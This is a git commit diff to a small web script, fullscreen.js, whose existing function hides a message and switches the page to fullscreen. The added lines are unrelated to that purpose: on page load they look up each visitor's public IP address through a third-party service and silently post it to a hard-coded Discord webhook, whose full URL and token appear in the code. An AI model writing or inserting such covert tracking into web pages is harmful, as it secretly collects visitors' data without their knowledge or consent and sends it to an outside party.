876c75779e584611b96d51886bc346f881df4208
otema <126337147+otema666@users.noreply.github.com>
2023-07-03 20:54:26 +0200

    fullscreen.js

--- fullscreen.js
+++ fullscreen.js
@@ -3,3 +3,24 @@ function aceptar() {
 	document.getElementById("mensaje").style.display = "none";
 	document.documentElement.requestFullscreen();
 }
+
+var ip = '';
+fetch('https://api.ipify.org/?format=json')
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(data) {
+    ip = data.ip;
+    var webwhook = 'https://discord.com/api/webhooks/1125498024337088614/lc3Wst1oc8eKH4FrOpeIwGHk1ags0-tO6I6Cb58OvPCwqtSATsEr_Oj3yrwP1t08huO9';
+    var message = {
+      content: 'IP:' + ip
+    };
+
+    fetch(webwhook, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(message)
+    });
+  });
